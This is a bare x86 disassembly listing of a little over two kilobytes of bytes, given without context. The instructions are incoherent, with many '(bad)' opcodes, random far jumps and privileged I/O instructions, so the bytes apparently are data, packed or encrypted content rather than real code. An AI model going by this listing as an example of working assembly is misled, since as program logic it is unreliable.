  41ac0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac10:	mov    edx,0x20ba7443
  41ac15:	das    
  41ac16:	pop    esp
  41ac17:	cli    
  41ac18:	jb     0x41ac4f
  41ac1a:	repnz inc ebp
  41ac1c:	shr    BYTE PTR [edi+0x4fabec9f],cl
  41ac22:	test   eax,0xea60fc27
  41ac27:	cmp    eax,0x756162f5
  41ac2c:	mov    dl,0xaa
  41ac2e:	add    al,0x6e
  41ac30:	outs   dx,DWORD PTR ds:[esi]
  41ac31:	ins    DWORD PTR es:[edi],dx
  41ac32:	stc    
  41ac33:	inc    ebx
  41ac34:	inc    edx
  41ac35:	dec    ebp
  41ac36:	hlt    
  41ac37:	adc    ah,dl
  41ac39:	push   0x4
  41ac3b:	outs   dx,BYTE PTR ds:[esi]
  41ac3c:	push   edx
  41ac3d:	inc    esi
  41ac3e:	adc    ah,BYTE PTR [edx+ebp*4-0x48615486]
  41ac45:	(bad)  
  41ac46:	ss mov esi,0x7489ef00
  41ac4c:	lods   eax,DWORD PTR ds:[esi]
  41ac4d:	lods   al,BYTE PTR ds:[esi]
  41ac4e:	hlt    
  41ac4f:	ins    BYTE PTR es:[edi],dx
  41ac50:	std    
  41ac51:	pop    esi
  41ac52:	cdq    
  41ac53:	add    DWORD PTR [ecx+0x7f1ea594],esp
  41ac59:	dec    ebx
  41ac5a:	dec    ebx
  41ac5b:	jecxz  0x41abe0
  41ac5d:	jge    0x41ac57
  41ac5f:	inc    ebp
  41ac60:	jno    0x41ac2b
  41ac62:	add    DWORD PTR [ebx+0x57],edi
  41ac65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac66:	xchg   eax,esp
  41ac68:	or     eax,0xca650b3a
  41ac6d:	in     al,dx
  41ac6e:	lds    ecx,FWORD PTR [esi]
  41ac70:	fcom   DWORD PTR ds:0xd9fcecab
  41ac76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac77:	sub    DWORD PTR [ebp-0x2a0773f9],edx
  41ac7d:	push   edx
  41ac7e:	jl     0x41ac7c
  41ac80:	and    al,0x61
  41ac82:	mov    bh,0xf3
  41ac84:	jbe    0x41ac32
  41ac86:	cmp    eax,0xce2edff9
  41ac8b:	xchg   edx,eax
  41ac8c:	dec    esp
  41ac8e:	jmp    0x920:0x77ef3bb7
  41ac95:	ss jnp 0x41ac9e
  41ac98:	jae    0x41ad0b
  41ac9a:	fidiv  DWORD PTR [ebp-0x35e55d51]
  41aca0:	aas    
  41aca1:	jmp    0x261fc1fc
  41aca6:	push   ebx
  41aca7:	adc    DWORD PTR [edx+esi*8-0x4],esp
  41acab:	int    0x37
  41acad:	stc    
  41acae:	inc    edi
  41acaf:	mov    dh,0xce
  41acb1:	push   eax
  41acb2:	mov    ds:0xb1d7aa6e,al
  41acb7:	bound  edx,QWORD PTR [ebx-0x2f]
  41acba:	dec    edi
  41acbb:	jp     0x41ac90
  41acbd:	daa    
  41acbe:	mov    dh,0x2d
  41acc0:	jo     0x41acbe
  41acc2:	dec    edi
  41acc3:	aad    0x2
  41acc5:	mov    esi,0xb2a129fe
  41acca:	in     eax,0x52
  41accc:	int    0xc3
  41acce:	and    DWORD PTR [esi*2-0x3237b88b],edi
  41acd5:	push   ecx
  41acd6:	inc    esi
  41acd7:	cmp    eax,0xfd65c38c
  41acdc:	or     BYTE PTR [edx],0xbc
  41acdf:	sbb    DWORD PTR [edi],eax
  41ace1:	test   al,0x1d
  41ace3:	aas    
  41ace4:	jb     0x41ad10
  41ace6:	in     eax,0x2a
  41ace8:	jmp    0x41acdf
  41acea:	std    
  41aceb:	sbb    eax,0xc0336993
  41acf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acf1:	test   DWORD PTR ds:0x6a881fb8,ebp
  41acf7:	pxor   mm3,QWORD PTR [edx+0x2]
  41acfb:	jl     0x41acbd
  41acfd:	arpl   WORD PTR [ebp-0x27d73e71],dx
  41ad03:	fdiv   QWORD PTR [ecx+edx*1+0x2e]
  41ad07:	jmp    0x41ad51
  41ad09:	ret    
  41ad0a:	mov    BYTE PTR [ebx+0x5f],ch
  41ad0d:	cwde   
  41ad0e:	add    bl,BYTE PTR [esi+ebp*8]
  41ad11:	adc    BYTE PTR [edx],ch
  41ad13:	push   esi
  41ad14:	sbb    dh,BYTE PTR [esi+0x44]
  41ad17:	ret    0x359c
  41ad1a:	scas   eax,DWORD PTR es:[edi]
  41ad1b:	and    BYTE PTR fs:[ebx-0x46],dl
  41ad1f:	and    al,0xd7
  41ad21:	dec    ebx
  41ad22:	xor    eax,0x8e1b2d97
  41ad27:	nop
  41ad28:	sahf   
  41ad29:	xlat   BYTE PTR ds:[ebx]
  41ad2a:	add    al,0xc5
  41ad2c:	(bad)  
  41ad2e:	out    dx,eax
  41ad2f:	mov    ecx,0xa001e837
  41ad34:	cs ret 
  41ad36:	dec    esp
  41ad37:	stc    
  41ad38:	mov    eax,0xcfb01490
  41ad3d:	jl     0x41ad5b
  41ad3f:	jo     0x41ada8
  41ad41:	sti    
  41ad42:	pusha  
  41ad43:	push   cs
  41ad44:	jl     0x41acd1
  41ad46:	xor    edx,ebx
  41ad48:	stos   BYTE PTR es:[edi],al
  41ad49:	test   BYTE PTR [ebx+0x4d],dl
  41ad4c:	pop    ss
  41ad4d:	push   0x21f1115d
  41ad52:	sbb    al,al
  41ad54:	out    dx,al
  41ad55:	mov    esi,0xb6e99afb
  41ad5a:	rol    DWORD PTR [esi],1
  41ad5c:	mov    ds:0x4422036b,eax
  41ad61:	inc    ecx
  41ad62:	lds    ebp,FWORD PTR [ebp+0x4c]
  41ad65:	cmp    cl,BYTE PTR [ebx-0x67]
  41ad68:	test   DWORD PTR ds:0xdcd2b73e,0x67b5186f
  41ad72:	adc    eax,0xdabf74fa
  41ad77:	(bad)  
  41ad78:	push   eax
  41ad79:	mov    dh,0x27
  41ad7b:	aad    0x36
  41ad7d:	dec    ecx
  41ad7e:	dec    esi
  41ad7f:	pop    ebx
  41ad80:	cs push ebx
  41ad82:	mov    bl,0xb2
  41ad84:	(bad)  
  41ad85:	jmp    0x12924582
  41ad8a:	add    eax,0xa250c8d3
  41ad8f:	scas   eax,DWORD PTR es:[edi]
  41ad90:	xchg   edi,eax
  41ad91:	(bad)  
  41ad92:	xchg   ebx,eax
  41ad93:	out    0x1c,ax
  41ad96:	and    ecx,DWORD PTR [edi+0x3e943d12]
  41ad9c:	push   edx
  41ad9d:	rol    BYTE PTR [edx],0x94
  41ada0:	bound  edx,QWORD PTR [eax]
  41ada2:	fisub  DWORD PTR [eax-0x127bee90]
  41ada8:	xchg   edi,eax
  41ada9:	dec    edx
  41adaa:	mov    DWORD PTR [edi+0x401a2d58],edi
  41adb0:	clc    
  41adb1:	ret    0xad91
  41adb4:	pushf  
  41adb5:	sbb    al,0xf
  41adb7:	adc    dl,BYTE PTR [ebx+0x67]
  41adba:	div    DWORD PTR [eax+edx*2-0x2e]
  41adbe:	and    bl,BYTE PTR [esi+esi*1-0x65]
  41adc2:	call   0x3930:0xf52d433
  41adc9:	leave  
  41adca:	rol    DWORD PTR [edi],0xde
  41adcd:	fwait
  41adce:	and    ecx,edi
  41add0:	mov    cl,0x73
  41add2:	add    DWORD PTR [esi+0x57],edi
  41add5:	xor    ch,dh
  41add7:	xchg   BYTE PTR [ebp-0x4e17c5ab],al
  41addd:	push   ebx
  41adde:	cmp    edx,DWORD PTR [esp+eax*1-0x47a1d9fb]
  41ade5:	dec    esp
  41ade6:	jecxz  0x41ae42
  41ade8:	lock mov edi,0xdff32463
  41adee:	sub    al,0x3b
  41adf0:	pop    esi
  41adf1:	add    al,0xff
  41adf3:	push   ss
  41adf4:	shl    al,cl
  41adf6:	and    al,0xa2
  41adf8:	js     0x41ae41
  41adfa:	ds push esp
  41adfc:	sub    DWORD PTR [eax+esi*1-0x301daeef],eax
  41ae03:	sti    
  41ae04:	add    BYTE PTR [esi-0x27413cda],dl
  41ae0a:	mov    ah,0xf8
  41ae0c:	dec    esi
  41ae0d:	int3   
  41ae0e:	fld    DWORD PTR ds:0x923b02c7
  41ae14:	(bad)  
  41ae15:	jae    0x41ae8d
  41ae17:	ins    BYTE PTR es:[edi],dx
  41ae18:	popf   
  41ae19:	aaa    
  41ae1a:	ja     0x41ae9a
  41ae1c:	push   ds
  41ae1d:	retf   0x2e96
  41ae20:	jecxz  0x41ae6e
  41ae22:	pop    es
  41ae23:	les    edi,FWORD PTR [esi-0x1a8d7ad1]
  41ae29:	cdq    
  41ae2a:	rcl    BYTE PTR [eax],cl
  41ae2c:	push   ebp
  41ae2d:	and    BYTE PTR ds:0xaaa01133,dl
  41ae33:	add    al,0xd2
  41ae35:	add    dl,cl
  41ae37:	ror    DWORD PTR [esi+edx*8],1
  41ae3a:	dec    esp
  41ae3b:	cmp    bl,0x18
  41ae3e:	dec    ecx
  41ae3f:	pop    edx
  41ae40:	(bad)  
  41ae41:	jmp    0x41ade7
  41ae43:	aaa    
  41ae44:	(bad)  
  41ae45:	inc    edi
  41ae46:	push   edx
  41ae47:	dec    esi
  41ae48:	pxor   mm3,QWORD PTR [eax+0x590532b]
  41ae4f:	mov    edx,0xabfabfc5
  41ae54:	or     cl,bh
  41ae56:	aad    0x40
  41ae58:	addr16 and edi,eax
  41ae5b:	sbb    ah,bh
  41ae5d:	pusha  
  41ae5e:	cmp    eax,0x83dc27a2
  41ae63:	mov    ebx,0x7108f1a
  41ae68:	sar    DWORD PTR [edx],cl
  41ae6a:	push   ecx
  41ae6b:	ficomp WORD PTR [edi+eax*4+0x4a72413b]
  41ae72:	fiadd  DWORD PTR ds:0xef90fba9
  41ae78:	fistp  WORD PTR [ecx+0x612d6b5d]
  41ae7e:	push   esp
  41ae7f:	adc    DWORD PTR [ecx+edx*1-0x25],ecx
  41ae83:	mov    ds:0xbf6cbbce,eax
  41ae88:	in     eax,0x6f
  41ae8a:	fwait
  41ae8b:	jae    0x41ae5a
  41ae8d:	outs   dx,BYTE PTR ds:[esi]
  41ae8e:	test   ah,al
  41ae90:	or     esp,DWORD PTR [ecx]
  41ae92:	jp     0x41aefe
  41ae94:	or     DWORD PTR [ebx-0x74ed32f0],edi
  41ae9a:	jno    0x41af0a
  41ae9c:	enter  0xf1fa,0x6c
  41aea0:	das    
  41aea1:	loope  0x41ae33
  41aea3:	dec    esp
  41aea4:	(bad)  
  41aea5:	pop    esp
  41aea6:	adc    edx,DWORD PTR [ecx-0x4d681a9b]
  41aeac:	popa   
  41aead:	js     0x41af1f
  41aeaf:	inc    ecx
  41aeb0:	mov    BYTE PTR [eax+ebx*8],ch
  41aeb3:	jo     0x41ae3f
  41aeb5:	cdq    
  41aeb6:	mov    al,ds:0xf1ef617c
  41aebb:	jo     0x41aef4
  41aebd:	ss mov ecx,0xfb485d87
  41aec3:	jge    0x41ae66
  41aec5:	dec    ebp
  41aec6:	or     al,BYTE PTR [ebx+0x14]
  41aec9:	div    BYTE PTR [ebx]
  41aecb:	call   0x4de6:0x58a5a807
  41aed2:	out    dx,al
  41aed3:	adc    eax,0xb24f9e97
  41aed8:	jae    0x41ae9d
  41aeda:	and    esi,DWORD PTR [esi+0x7c]
  41aedd:	sbb    eax,0xab1462a3
  41aee2:	outs   dx,BYTE PTR ds:[esi]
  41aee3:	cdq    
  41aee4:	stos   BYTE PTR es:[edi],al
  41aee5:	test   al,dh
  41aee7:	adc    bl,BYTE PTR [ebx-0x18f27ddd]
  41aeed:	ins    DWORD PTR es:[edi],dx
  41aeee:	stc    
  41aeef:	pop    esi
  41aef0:	dec    ecx
  41aef1:	pop    ebp
  41aef2:	div    DWORD PTR [ebx+0x74]
  41aef5:	adc    BYTE PTR [ecx-0x17115ff1],dl
  41aefb:	rcl    ch,0x77
  41aefe:	cmp    DWORD PTR ds:0xb065f3,edx
  41af04:	jae    0x41af06
  41af06:	and    al,bh
  41af08:	mov    edx,0x6b416661
  41af0d:	sahf   
  41af0e:	mov    esp,DWORD PTR [ebx]
  41af10:	jecxz  0x41af46
  41af12:	fsub   st,st(3)
  41af14:	pop    ds
  41af15:	jecxz  0x41aef4
  41af17:	dec    ecx
  41af18:	lods   eax,DWORD PTR ds:[esi]
  41af19:	imul   edi,eax,0xd73eae09
  41af1f:	mov    WORD PTR [ecx+0x5a],fs
  41af22:	addr16 es jo 0x41af0c
  41af26:	gs loope 0x41af54
  41af29:	in     al,dx
  41af2a:	mov    ah,0x1f
  41af2c:	in     al,0xce
  41af2e:	add    edi,DWORD PTR [edi-0x363fbf18]
  41af34:	xchg   ecx,eax
  41af35:	mov    edi,0xf6e2de0b
  41af3a:	aas    
  41af3b:	xchg   DWORD PTR [esi-0x57],ebx
  41af3e:	lods   eax,DWORD PTR ds:[esi]
  41af3f:	add    ebp,esi
  41af41:	pop    ss
  41af42:	stc    
  41af43:	add    BYTE PTR [ecx+0x1574f5d3],ch
  41af49:	mov    ah,0x8d
  41af4b:	inc    esp
  41af4c:	pop    ss
  41af4d:	mov    bh,0x96
  41af4f:	dec    edx
  41af50:	call   0x4567b7
  41af55:	(bad)  [esi-0x4aab85f5]
  41af5b:	mov    ecx,0x3fdfc475
  41af60:	pop    ss
  41af61:	adc    edx,ebp
  41af63:	push   ecx
  41af64:	sbb    ebx,0xffffff9e
  41af67:	xchg   DWORD PTR [eax],ebx
  41af69:	mov    al,0xbf
  41af6b:	cmp    al,0x99
  41af6d:	sbb    ah,ch
  41af6f:	sub    eax,0xb2ee6387
  41af74:	mov    WORD PTR [ecx-0x7ccb5262],cs
  41af7a:	fimul  DWORD PTR [ebp-0x44]
  41af7d:	and    eax,ecx
  41af7f:	std    
  41af80:	retf   0xacf8
  41af83:	imul   esi,DWORD PTR [ebx],0x25
  41af86:	jmp    0x41afbe
  41af88:	dec    edx
  41af89:	ffreep st(2)
  41af8b:	nop
  41af8c:	out    dx,al
  41af8d:	dec    esp
  41af8e:	dec    ebp
  41af8f:	jl     0x41af99
  41af91:	ds imul ebp,esp,0x70
  41af95:	xor    BYTE PTR [edi],dl
  41af97:	cdq    
  41af98:	outs   dx,BYTE PTR ds:[esi]
  41af99:	xchg   ecx,eax
  41af9a:	xlat   BYTE PTR ds:[ebx]
  41af9b:	jno    0x41b01a
  41af9d:	and    ebp,DWORD PTR ds:0x7cf3a85c
  41afa3:	inc    edx
  41afa4:	dec    dl
  41afa6:	push   edi
  41afa7:	and    DWORD PTR ds:0x70f30d67,ebp
  41afad:	out    0x34,al
  41afaf:	mov    ebp,0xfced2bde
  41afb4:	popf   
  41afb5:	jae    0x41af66
  41afb7:	push   ss
  41afb8:	pop    dx
  41afba:	fisubr WORD PTR [eax+0x48]
  41afbd:	dec    esi
  41afbe:	mov    ebp,0x42460a52
  41afc3:	aaa    
  41afc4:	sbb    BYTE PTR [ebp+0x33],ah
  41afc7:	inc    esp
  41afc8:	add    ah,BYTE PTR [esi+0x1d]
  41afcb:	scas   eax,DWORD PTR es:[edi]
  41afcc:	inc    ecx
  41afcd:	jo     0x41af8d
  41afcf:	pusha  
  41afd0:	xchg   esi,eax
  41afd1:	pop    esi
  41afd2:	gs inc esp
  41afd4:	ror    dh,1
  41afd6:	daa    
  41afd7:	clc    
  41afd8:	imul   edx,DWORD PTR [eax],0xe86879ab
  41afde:	adc    eax,0xe2558dbe
  41afe3:	loope  0x41b035
  41afe5:	aad    0x46
  41afe7:	cmp    DWORD PTR [edx+0x45194728],edi
  41afed:	sbb    ebx,DWORD PTR [ebx]
  41afef:	mov    ebp,0x5422a4f8
  41aff4:	pop    esp
  41aff5:	add    eax,0x9a64546c
  41affa:	cmp    ah,BYTE PTR [eax+0x57]
  41affd:	jle    0x41b058
  41afff:	enter  0xbbf,0xf6
  41b003:	cwde   
  41b004:	xchg   esi,eax
  41b005:	fdivr  st,st(1)
  41b007:	xchg   edx,eax
  41b008:	mov    esp,DWORD PTR [edx+0x59902f1d]
  41b00e:	ins    DWORD PTR es:[edi],dx
  41b00f:	add    cl,BYTE PTR [ecx-0x439b1626]
  41b015:	pop    esi
  41b016:	cmp    eax,0x5d2dd5dc
  41b01b:	sbb    al,0x84
  41b01d:	sub    dl,dl
  41b01f:	repz retf 0xfff5
  41b023:	or     al,0xc1
  41b025:	push   edx
  41b026:	lock cld 
  41b028:	push   cs
  41b029:	mov    bl,0x62
  41b02b:	mov    al,ds:0x85cc3694
  41b030:	ds repnz or al,0x57
  41b034:	sti    
  41b035:	(bad)  
  41b036:	mov    ecx,0x2cb3b1f1
  41b03b:	fcom   QWORD PTR [ecx+eax*2]
  41b03e:	pop    es
  41b03f:	jg     0x41b004
  41b041:	aad    0x3c
  41b043:	clc    
  41b044:	mov    al,0x5
  41b046:	push   ss
  41b047:	push   ecx
  41b048:	xchg   esp,eax
  41b049:	xchg   ebx,eax
  41b04a:	add    dh,BYTE PTR [edi-0x536f2e0f]
  41b050:	mov    al,0x31
  41b052:	adc    al,0x59
  41b054:	mov    ds:0x2113500e,al
  41b059:	imul   esp,DWORD PTR [esi+0x2419d134],0x7f
  41b060:	xchg   esp,eax
  41b061:	hlt    
  41b062:	pop    es
  41b063:	daa    
  41b064:	inc    edx
  41b065:	push   ss
  41b066:	(bad)  
  41b067:	push   ebp
  41b068:	or     bl,BYTE PTR [edx+0x691f1624]
  41b06e:	mov    edx,DWORD PTR [esi+0x27]
  41b071:	ja     0x41b0d0
  41b073:	push   eax
  41b074:	(bad)  
  41b075:	and    edx,DWORD PTR [ebp+0x4d]
  41b078:	inc    esp
  41b079:	jmp    0xd4eb:0x2483e1d2
  41b080:	into   
  41b081:	inc    edx
  41b082:	push   ds
  41b083:	pop    ebx
  41b084:	sahf   
  41b085:	jb     0x41b0ba
  41b087:	pop    ss
  41b088:	xchg   edx,eax
  41b089:	jmp    0xea3e:0xf29b25af
  41b090:	ins    DWORD PTR es:[edi],dx
  41b091:	in     eax,dx
  41b092:	repnz mov al,0xeb
  41b095:	fldcw  WORD PTR [eax]
  41b097:	test   DWORD PTR [eax],edx
  41b099:	sbb    bh,BYTE PTR ds:0x27853dec
  41b09f:	sbb    al,0x18
  41b0a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0a2:	scas   eax,DWORD PTR es:[edi]
  41b0a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0a4:	xor    eax,DWORD PTR [edi-0x4a]
  41b0a7:	ficom  DWORD PTR [ebp+eiz*2+0x62]
  41b0ab:	enter  0x7e73,0x3b
  41b0af:	xchg   esi,eax
  41b0b0:	out    dx,al
  41b0b1:	xchg   edx,eax
  41b0b2:	aaa    
  41b0b3:	dec    edx
  41b0b4:	mov    BYTE PTR [ebp+0x2f],cl
  41b0b7:	test   eax,0x8559d4a6
  41b0bc:	loope  0x41b094
  41b0be:	push   eax
  41b0bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0c0:	loope  0x41b0a4
  41b0c2:	sub    ebp,esi
  41b0c4:	or     DWORD PTR [edx-0x757e2b6f],0xffffff9b
  41b0cb:	pop    esi
  41b0cc:	mov    esi,DWORD PTR [edi-0x3e]
  41b0cf:	or     eax,0x146f0a5f
  41b0d4:	inc    esi
  41b0d5:	ret    0xd91c
  41b0d8:	mov    eax,ds:0x39fd2627
  41b0dd:	pop    ss
  41b0de:	cdq    
  41b0df:	repnz adc ch,bl
  41b0e2:	adc    bh,BYTE PTR [esi-0x6a0dbc51]
  41b0e8:	(bad)  
  41b0e9:	mov    edi,ecx
  41b0eb:	mov    ecx,0x3020fe1c
  41b0f0:	aam    0xbb
  41b0f2:	imul   ebx,DWORD PTR [eax-0x15641f90],0xbce1f9ff
  41b0fc:	inc    edx
  41b0fd:	fstp   DWORD PTR [edi-0x2d]
  41b100:	push   0x630cc826
  41b105:	push   ebp
  41b106:	arpl   sp,di
  41b108:	push   ecx
  41b109:	jl     0x41b10e
  41b10b:	push   cs
  41b10c:	mov    bl,0x7b
  41b10e:	push   esi
  41b10f:	cli    
  41b110:	xchg   edi,eax
  41b111:	(bad)  
  41b112:	out    dx,eax
  41b113:	fistp  DWORD PTR [edx+ecx*2]
  41b116:	clc    
  41b117:	lods   eax,DWORD PTR ds:[esi]
  41b118:	pop    ebp
  41b119:	inc    ebp
  41b11a:	(bad)
  41b11d:	mov    dh,0x88
  41b11f:	nop
  41b120:	lods   al,BYTE PTR ds:[esi]
  41b121:	jge    0x41b104
  41b123:	mov    edx,0x251ad3ed
  41b128:	mov    ds:0x14486195,eax
  41b12d:	mov    al,ds:0x31e1aad1
  41b132:	xchg   esi,eax
  41b133:	inc    edx
  41b134:	imul   esp,DWORD PTR [ebx-0x1e7bfa3b],0xa4fad929
  41b13e:	push   ss
  41b13f:	jo     0x41b14b
  41b141:	sbb    edx,eax
  41b143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b144:	jno    0x41b0cb
  41b146:	and    DWORD PTR [ecx+0x630f6f80],eax
  41b14c:	xchg   edx,eax
  41b14d:	mov    esi,0x13d33a5e
  41b152:	cmp    BYTE PTR [ecx+0x29d90a7f],dl
  41b158:	mov    dl,0x5a
  41b15a:	cs cmp al,0x53
  41b15d:	outs   dx,DWORD PTR ds:[esi]
  41b15e:	jp     0x41b158
  41b160:	jne    0x41b169
  41b162:	mov    ebp,0x962d523c
  41b167:	sbb    ebx,DWORD PTR [ebx]
  41b169:	arpl   WORD PTR [edx-0x68],ax
  41b16c:	mov    esp,0xe8b47c40
  41b171:	sbb    al,0x7f
  41b173:	(bad)  
  41b174:	mov    eax,0x20f2fa9d
  41b179:	push   ss
  41b17a:	adc    DWORD PTR [edi-0x76],edi
  41b17d:	xchg   edi,eax
  41b17e:	add    eax,0x4206262f
  41b183:	out    dx,al
  41b184:	scas   al,BYTE PTR es:[edi]
  41b185:	xor    eax,0x4ab5000e
  41b18a:	(bad)  
  41b18b:	cmc    
  41b18c:	stos   BYTE PTR es:[edi],al
  41b18d:	not    DWORD PTR [ebx+0x645d4c43]
  41b193:	push   0x46
  41b195:	inc    edi
  41b196:	into   
  41b197:	out    dx,al
  41b198:	lea    ebx,[edi-0x4e1ddd58]
  41b19e:	dec    ecx
  41b19f:	int    0x96
  41b1a1:	cmp    esp,ecx
  41b1a3:	mov    DWORD PTR [ebp-0x43e2b5c1],0xfa1f1ad4
  41b1ad:	sub    BYTE PTR [ecx-0x6b65a3a],0xca
  41b1b4:	ins    DWORD PTR es:[edi],dx
  41b1b5:	loopne 0x41b1dc
  41b1b7:	push   cs
  41b1b8:	fcom   QWORD PTR [ebp-0x56]
  41b1bb:	pushf  
  41b1bc:	es dec esp
  41b1be:	mov    esi,0x492146e3
  41b1c3:	shl    esi,0xe8
  41b1c6:	sub    esp,DWORD PTR [ebx+0x5f]
  41b1c9:	dec    ebx
  41b1ca:	sbb    al,0xeb
  41b1cc:	(bad)  
  41b1ce:	pushf  
  41b1cf:	jbe    0x41b183
  41b1d1:	sbb    al,0x5b
  41b1d3:	pusha  
  41b1d4:	popf   
  41b1d5:	call   0xeb289eca
  41b1da:	leave  
  41b1db:	js     0x41b1e8
  41b1dd:	aad    0x94
  41b1df:	or     ch,BYTE PTR [eax+0xf89e092]
  41b1e5:	mov    cl,0xf
  41b1e7:	mov    bh,0xa7
  41b1e9:	in     al,dx
  41b1ea:	fs leave 
  41b1ec:	arpl   sp,bx
  41b1ee:	call   0x8435478b
  41b1f3:	sahf   
  41b1f4:	(bad)  
  41b1f5:	jno    0x41b1f2
  41b1f7:	in     eax,dx
  41b1f8:	stc    
  41b1f9:	rol    DWORD PTR [edi+0x1f750b8a],cl
  41b1ff:	add    eax,ebx
  41b201:	mov    bh,0xb7
  41b203:	sub    al,0x79
  41b205:	mov    BYTE PTR [ebp-0x6b],0x6d
  41b209:	pusha  
  41b20a:	push   ebx
  41b20b:	adc    BYTE PTR [ecx-0x76fb8ca9],0x2e
  41b212:	aad    0xd0
  41b214:	push   edi
  41b215:	int3   
  41b216:	jno    0x41b23e
  41b218:	add    bh,BYTE PTR [ecx+0x2fb37cc3]
  41b21e:	jle    0x41b291
  41b220:	mov    ?,edi
  41b222:	xchg   ecx,eax
  41b223:	cmp    bh,BYTE PTR [esi-0x5ac43580]
  41b229:	cli    
  41b22a:	addr16 cld 
  41b22c:	jb     0x41b1e4
  41b22e:	push   ds
  41b22f:	int3   
  41b230:	adc    eax,0xc04b5dc9
  41b235:	in     eax,dx
  41b236:	test   al,0x57
  41b238:	xor    BYTE PTR [edx],0x6a
  41b23b:	stos   DWORD PTR es:[edi],eax
  41b23c:	xchg   dl,dh
  41b23e:	xchg   edi,eax
  41b23f:	popf   
  41b240:	loope  0x41b298
  41b242:	loopne 0x41b230
  41b244:	mov    eax,0xb98c8808
  41b249:	inc    edx
  41b24a:	mov    al,0x4c
  41b24c:	dec    edi
  41b24d:	imul   ecx,esi,0x43
  41b250:	das    
  41b251:	mov    dl,0x6e
  41b253:	sub    DWORD PTR [edx+ecx*4+0x3b],0xffffff82
  41b258:	popa   
  41b259:	das    
  41b25a:	sbb    al,0x35
  41b25c:	or     dl,ah
  41b25e:	or     DWORD PTR [edx+0x5b698f],edi
  41b264:	pop    es
  41b265:	xchg   DWORD PTR [ebx+0x3b],ecx
  41b268:	jecxz  0x41b233
  41b26a:	push   0x36f3424a
  41b26f:	(bad)  
  41b270:	adc    al,0xfb
  41b272:	cmp    BYTE PTR [edi],cl
  41b274:	push   esi
  41b275:	mov    eax,ds:0x5159f96
  41b27a:	(bad)  
  41b27b:	pusha  
  41b27c:	dec    ebx
  41b27d:	lds    ecx,FWORD PTR [eax+ebp*4-0x7]
  41b281:	test   al,0xdc
  41b283:	pop    es
  41b284:	stc    
  41b285:	mov    al,ds:0x5c75cc91
  41b28a:	cwde   
  41b28b:	call   0x7b84f0e3
  41b290:	cmc    
  41b291:	pop    ecx
  41b292:	jp     0x41b295
  41b294:	cmp    BYTE PTR [bp+di],dl
  41b297:	cmp    al,0x3a
  41b299:	fist   WORD PTR [eax-0xbd3b294]
  41b29f:	lahf   
  41b2a0:	(bad)  
  41b2a1:	rcr    BYTE PTR [edi+edi*2+0x501b0433],cl
  41b2a8:	xor    BYTE PTR [ebp-0x21],al
  41b2ab:	mov    DWORD PTR [ebx+0x45],edx
  41b2ae:	xor    DWORD PTR [esi-0x415c10fc],esp
  41b2b4:	cwde   
  41b2b5:	mov    eax,ds:0x8fca796d
  41b2ba:	fild   WORD PTR [ecx-0x1a]
  41b2bd:	out    0x9a,al
  41b2bf:	lea    edi,[eax]
  41b2c1:	jle    0x41b302
  41b2c3:	ins    DWORD PTR es:[edi],dx
  41b2c4:	xchg   ebx,eax
  41b2c5:	mov    cl,0x56
  41b2c7:	mov    ebp,0x4e0c9ef6
  41b2cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2cd:	and    al,0x1e
  41b2cf:	in     al,0xf9
  41b2d1:	inc    ebx
  41b2d2:	fs aas 
  41b2d4:	shr    DWORD PTR [ecx],cl
  41b2d6:	inc    ebx
  41b2d7:	test   al,0xc
  41b2d9:	ss es ret 0xb806
  41b2de:	call   DWORD PTR [eax-0x31919230]
  41b2e4:	fs repnz push cs
  41b2e7:	enter  0xb14,0xfc
  41b2eb:	pushf  
  41b2ec:	add    bh,BYTE PTR [esi]
  41b2ee:	(bad)
  41b2f2:	lea    esp,[eax]
  41b2f4:	jge    0x41b2f8
  41b2f6:	jmp    0xfcf9c854
  41b2fb:	push   ds
  41b2fc:	jmp    0x19e9b280
  41b301:	xchg   esp,eax
  41b302:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b303:	fcom   st(2)
  41b305:	mov    al,0xde
  41b307:	jmp    0x41b340
  41b309:	arpl   WORD PTR [ecx],dx
  41b30b:	scas   eax,DWORD PTR es:[edi]
  41b30c:	loope  0x41b370
  41b30e:	adc    eax,0x6e3f7fe0
  41b313:	fwait
  41b314:	aad    0x3e
  41b316:	sbb    al,0xbe
  41b318:	shl    BYTE PTR [eax+0x77],0x9a
  41b31c:	jne    0x41b2cb
  41b31e:	sbb    eax,DWORD PTR [ecx]
  41b320:	jmp    DWORD PTR [ecx-0x1114aef6]
  41b326:	pop    ebp
  41b327:	mov    bl,0xab
  41b329:	adc    eax,0xdade800
  41b32e:	fstp   DWORD PTR [edx+0x3f]
  41b331:	push   0x53
  41b333:	scas   al,BYTE PTR es:[edi]
  41b334:	adc    BYTE PTR [edx],0x1b
  41b337:	aad    0x59
  41b339:	aad    0x25
  41b33b:	sti    
  41b33c:	or     al,0x1f
  41b33e:	lods   eax,DWORD PTR ds:[esi]
  41b33f:	add    BYTE PTR [eax+ebx*2+0x734932aa],0xca
  41b347:	ror    DWORD PTR [edx],cl
  41b349:	loop   0x41b3a4
  41b34b:	push   ss
  41b34c:	mov    ebx,0xc5c4aa19
  41b351:	lds    edi,FWORD PTR [edi-0x3be5576a]
  41b357:	cmp    al,0xc6
  41b359:	pusha  
  41b35a:	jb     0x41b3b3
  41b35c:	into   
  41b35d:	dec    BYTE PTR [eax]
  41b35f:	dec    ebx
  41b360:	std    
  41b361:	retf   
  41b362:	icebp  
  41b363:	cmp    al,0xdb
  41b365:	lods   al,BYTE PTR ds:[esi]
  41b366:	les    ebx,FWORD PTR [esi+0x6255621]
  41b36c:	stos   BYTE PTR es:[edi],al
  41b36d:	loop   0x41b3bf
  41b36f:	or     al,ah
  41b371:	fmul   QWORD PTR [edi+0x21]
  41b374:	fst    st(1)
  41b376:	repnz rol BYTE PTR [edi+0x32],cl
  41b37a:	jb     0x41b3d0
  41b37c:	(bad)  
  41b37d:	cli    
  41b37e:	and    bl,BYTE PTR [esi-0x7ca42aec]
  41b384:	or     eax,0xfcb96d17
  41b389:	sbb    edi,edi
